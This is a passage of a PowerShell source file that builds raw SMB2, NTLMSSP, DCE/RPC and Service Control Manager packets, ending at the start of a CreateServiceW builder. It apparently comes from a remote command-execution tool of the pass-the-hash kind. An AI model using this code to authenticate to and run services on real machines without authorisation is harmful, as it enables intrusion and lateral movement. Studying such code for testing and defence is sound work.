function Get-PacketSMB2NegotiateProtocolRequest()
{
    $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_StructureSize"",[Byte[]](0x24,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_DialectCount"",[Byte[]](0x02,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_SecurityMode"",[Byte[]](0x01,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_Reserved"",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_Capabilities"",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_ClientGUID"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_NegotiateContextOffset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_NegotiateContextCount"",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_Reserved2"",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_Dialect"",[Byte[]](0x02,0x02))
    $packet_SMB2NegotiateProtocolRequest.Add(""SMB2NegotiateProtocolRequest_Dialect2"",[Byte[]](0x10,0x02))

    return $packet_SMB2NegotiateProtocolRequest
}

function Get-PacketSMB2SessionSetupRequest()
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_StructureSize"",[Byte[]](0x19,0x00))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_Flags"",[Byte[]](0x00))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_SecurityMode"",[Byte[]](0x01))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_Capabilities"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_Channel"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_SecurityBufferOffset"",[Byte[]](0x58,0x00))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_SecurityBufferLength"",$packet_security_blob_length)
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_PreviousSessionID"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add(""SMB2SessionSetupRequest_Buffer"",$packet_security_blob)

    return $packet_SMB2SessionSetupRequest 
}

function Get-PacketSMB2TreeConnectRequest()
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeConnectRequest.Add(""SMB2TreeConnectRequest_StructureSize"",[Byte[]](0x09,0x00))
    $packet_SMB2TreeConnectRequest.Add(""SMB2TreeConnectRequest_Reserved"",[Byte[]](0x00,0x00))
    $packet_SMB2TreeConnectRequest.Add(""SMB2TreeConnectRequest_PathOffset"",[Byte[]](0x48,0x00))
    $packet_SMB2TreeConnectRequest.Add(""SMB2TreeConnectRequest_PathLength"",$packet_path_length)
    $packet_SMB2TreeConnectRequest.Add(""SMB2TreeConnectRequest_Buffer"",$packet_path)

    return $packet_SMB2TreeConnectRequest
}

function Get-PacketSMB2CreateRequestFile()
{
    param([Byte[]]$packet_named_pipe)

    $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]

    $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_StructureSize"",[Byte[]](0x39,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_Flags"",[Byte[]](0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_RequestedOplockLevel"",[Byte[]](0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_Impersonation"",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_SMBCreateFlags"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_Reserved"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_DesiredAccess"",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_FileAttributes"",[Byte[]](0x80,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_ShareAccess"",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_CreateDisposition"",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_CreateOptions"",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_NameOffset"",[Byte[]](0x78,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_NameLength"",$packet_named_pipe_length)
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_CreateContextsOffset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_CreateContextsLength"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add(""SMB2CreateRequestFile_Buffer"",$packet_named_pipe)

    return $packet_SMB2CreateRequestFile
}

function Get-PacketSMB2ReadRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_StructureSize"",[Byte[]](0x31,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_Padding"",[Byte[]](0x50))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_Flags"",[Byte[]](0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_Length"",[Byte[]](0x00,0x00,0x10,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_Offset"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_FileID"",$packet_file_ID)
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_MinimumCount"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_Channel"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_RemainingBytes"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_ReadChannelInfoOffset"",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_ReadChannelInfoLength"",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add(""SMB2ReadRequest_Buffer"",[Byte[]](0x30))

    return $packet_SMB2ReadRequest
}

function Get-PacketSMB2WriteRequest()
{
    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

    $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_StructureSize"",[Byte[]](0x31,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_DataOffset"",[Byte[]](0x70,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_Length"",$packet_write_length)
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_Offset"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_FileID"",$packet_file_ID)
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_Channel"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_RemainingBytes"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_WriteChannelInfoOffset"",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_WriteChannelInfoLength"",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add(""SMB2WriteRequest_Flags"",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SMB2WriteRequest
}

function Get-PacketSMB2CloseRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CloseRequest.Add(""SMB2CloseRequest_StructureSize"",[Byte[]](0x18,0x00))
    $packet_SMB2CloseRequest.Add(""SMB2CloseRequest_Flags"",[Byte[]](0x00,0x00))
    $packet_SMB2CloseRequest.Add(""SMB2CloseRequest_Reserved"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CloseRequest.Add(""SMB2CloseRequest_FileID"",$packet_file_ID)

    return $packet_SMB2CloseRequest
}

function Get-PacketSMB2TreeDisconnectRequest()
{
    $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeDisconnectRequest.Add(""SMB2TreeDisconnectRequest_StructureSize"",[Byte[]](0x04,0x00))
    $packet_SMB2TreeDisconnectRequest.Add(""SMB2TreeDisconnectRequest_Reserved"",[Byte[]](0x00,0x00))

    return $packet_SMB2TreeDisconnectRequest
}

function Get-PacketSMB2SessionLogoffRequest()
{
    $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionLogoffRequest.Add(""SMB2SessionLogoffRequest_StructureSize"",[Byte[]](0x04,0x00))
    $packet_SMB2SessionLogoffRequest.Add(""SMB2SessionLogoffRequest_Reserved"",[Byte[]](0x00,0x00))

    return $packet_SMB2SessionLogoffRequest
}



function Get-PacketNTLMSSPNegotiate()
{
    param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

    $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_InitialContextTokenID"",[Byte[]](0x60)) 
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_InitialcontextTokenLength"",$packet_ASN_length_1)
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_ThisMechID"",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_ThisMechLength"",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_OID"",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_InnerContextTokenID"",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_InnerContextTokenLength"",$packet_ASN_length_2)
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_InnerContextTokenID2"",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_InnerContextTokenLength2"",$packet_ASN_length_3)
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTypesID"",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTypesLength"",[Byte[]](0x0e))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTypesID2"",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTypesLength2"",[Byte[]](0x0c))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTypesID3"",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTypesLength3"",[Byte[]](0x0a))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechType"",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTokenID"",[Byte[]](0xa2))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MechTokenLength"",$packet_ASN_length_4)
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_NTLMSSPID"",[Byte[]](0x04))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_NTLMSSPLength"",$packet_NTLMSSP_length)
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_Identifier"",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_MessageType"",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_NegotiateFlags"",$packet_negotiate_flags)
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_CallingWorkstationDomain"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_CallingWorkstationName"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($packet_version)
    {
        $packet_NTLMSSPNegotiate.Add(""NTLMSSPNegotiate_Version"",$packet_version)
    }

    return $packet_NTLMSSPNegotiate
}

function Get-PacketNTLMSSPAuth()
{
    param([Byte[]]$packet_NTLM_response)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

    $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_ASNID"",[Byte[]](0xa1,0x82))
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_ASNLength"",$packet_ASN_length_1)
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_ASNID2"",[Byte[]](0x30,0x82))
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_ASNLength2"",$packet_ASN_length_2)
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_ASNID3"",[Byte[]](0xa2,0x82))
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_ASNLength3"",$packet_ASN_length_3)
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_NTLMSSPID"",[Byte[]](0x04,0x82))
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_NTLMSSPLength"",$packet_NTLMSSP_length)
    $packet_NTLMSSPAuth.Add(""NTLMSSPAuth_NTLMResponse"",$packet_NTLM_response)

    return $packet_NTLMSSPAuth
}



function Get-PacketRPCBind()
{
    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add(""RPCBind_Version"",[Byte[]](0x05))
    $packet_RPCBind.Add(""RPCBind_VersionMinor"",[Byte[]](0x00))
    $packet_RPCBind.Add(""RPCBind_PacketType"",[Byte[]](0x0b))
    $packet_RPCBind.Add(""RPCBind_PacketFlags"",[Byte[]](0x03))
    $packet_RPCBind.Add(""RPCBind_DataRepresentation"",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add(""RPCBind_FragLength"",[Byte[]](0x48,0x00))
    $packet_RPCBind.Add(""RPCBind_AuthLength"",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add(""RPCBind_CallID"",$packet_call_ID_bytes)
    $packet_RPCBind.Add(""RPCBind_MaxXmitFrag"",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add(""RPCBind_MaxRecvFrag"",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add(""RPCBind_AssocGroup"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add(""RPCBind_NumCtxItems"",$packet_num_ctx_items)
    $packet_RPCBind.Add(""RPCBind_Unknown"",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add(""RPCBind_ContextID"",$packet_context_ID)
    $packet_RPCBind.Add(""RPCBind_NumTransItems"",[Byte[]](0x01))
    $packet_RPCBind.Add(""RPCBind_Unknown2"",[Byte[]](0x00))
    $packet_RPCBind.Add(""RPCBind_Interface"",$packet_UUID)
    $packet_RPCBind.Add(""RPCBind_InterfaceVer"",$packet_UUID_version)
    $packet_RPCBind.Add(""RPCBind_InterfaceVerMinor"",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add(""RPCBind_TransferSyntax"",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add(""RPCBind_TransferSyntaxVer"",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add(""RPCBind_ContextID2"",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add(""RPCBind_NumTransItems2"",[Byte[]](0x01))
        $packet_RPCBind.Add(""RPCBind_Unknown3"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_Interface2"",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        $packet_RPCBind.Add(""RPCBind_InterfaceVer2"",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_InterfaceVerMinor2"",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_TransferSyntax2"",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_TransferSyntaxVer2"",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add(""RPCBind_ContextID2"",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add(""RPCBind_NumTransItems2"",[Byte[]](0x01))
        $packet_RPCBind.Add(""RPCBind_Unknown3"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_Interface2"",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add(""RPCBind_InterfaceVer2"",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_InterfaceVerMinor2"",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_TransferSyntax2"",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add(""RPCBind_TransferSyntaxVer2"",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_ContextID3"",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add(""RPCBind_NumTransItems3"",[Byte[]](0x01))
        $packet_RPCBind.Add(""RPCBind_Unknown4"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_Interface3"",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add(""RPCBind_InterfaceVer3"",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_InterfaceVerMinor3"",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_TransferSyntax3"",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_TransferSyntaxVer3"",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_AuthType"",[Byte[]](0x0a))
        $packet_RPCBind.Add(""RPCBind_AuthLevel"",[Byte[]](0x04))
        $packet_RPCBind.Add(""RPCBind_AuthPadLength"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_AuthReserved"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_ContextID4"",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_Identifier"",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add(""RPCBind_MessageType"",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_NegotiateFlags"",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add(""RPCBind_CallingWorkstationDomain"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_CallingWorkstationName"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_OSVersion"",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add(""RPCBind_AuthType"",[Byte[]](0x0a))
        $packet_RPCBind.Add(""RPCBind_AuthLevel"",[Byte[]](0x02))
        $packet_RPCBind.Add(""RPCBind_AuthPadLength"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_AuthReserved"",[Byte[]](0x00))
        $packet_RPCBind.Add(""RPCBind_ContextID3"",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_Identifier"",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add(""RPCBind_MessageType"",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_NegotiateFlags"",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add(""RPCBind_CallingWorkstationDomain"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_CallingWorkstationName"",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add(""RPCBind_OSVersion"",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function Get-PacketRPCRequest()
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
    $packet_auth_length = $packet_auth_length[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add(""RPCRequest_Version"",[Byte[]](0x05))
    $packet_RPCRequest.Add(""RPCRequest_VersionMinor"",[Byte[]](0x00))
    $packet_RPCRequest.Add(""RPCRequest_PacketType"",[Byte[]](0x00))
    $packet_RPCRequest.Add(""RPCRequest_PacketFlags"",$packet_flags)
    $packet_RPCRequest.Add(""RPCRequest_DataRepresentation"",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add(""RPCRequest_FragLength"",$packet_frag_length)
    $packet_RPCRequest.Add(""RPCRequest_AuthLength"",$packet_auth_length)
    $packet_RPCRequest.Add(""RPCRequest_CallID"",$packet_call_ID)
    $packet_RPCRequest.Add(""RPCRequest_AllocHint"",$packet_alloc_hint)
    $packet_RPCRequest.Add(""RPCRequest_ContextID"",$packet_context_ID)
    $packet_RPCRequest.Add(""RPCRequest_Opnum"",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add(""RPCRequest_Data"",$packet_data)
    }

    return $packet_RPCRequest
}



function Get-PacketSCMOpenSCManagerW()
{
    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
    $packet_referent_ID1 = [String](1..2 | ForEach-Object {""{0:X2}"" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID1 = $packet_referent_ID1.Split("" "") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID1 += 0x00,0x00
    $packet_referent_ID2 = [String](1..2 | ForEach-Object {""{0:X2}"" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID2 = $packet_referent_ID2.Split("" "") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID2 += 0x00,0x00

    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_MachineName_ReferentID"",$packet_referent_ID1)
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_MachineName_MaxCount"",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_MachineName_Offset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_MachineName_ActualCount"",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_MachineName"",$packet_service)
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_Database_ReferentID"",$packet_referent_ID2)
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_Database_NameMaxCount"",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_Database_NameOffset"",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_Database_NameActualCount"",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_Database"",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_Unknown"",[Byte[]](0xbf,0xbf))
    $packet_SCMOpenSCManagerW.Add(""SCMOpenSCManagerW_AccessMask"",[Byte[]](0x3f,0x00,0x00,0x00))
    
    return $packet_SCMOpenSCManagerW
}

function Get-PacketSCMCreateServiceW()
{
    param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
            [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
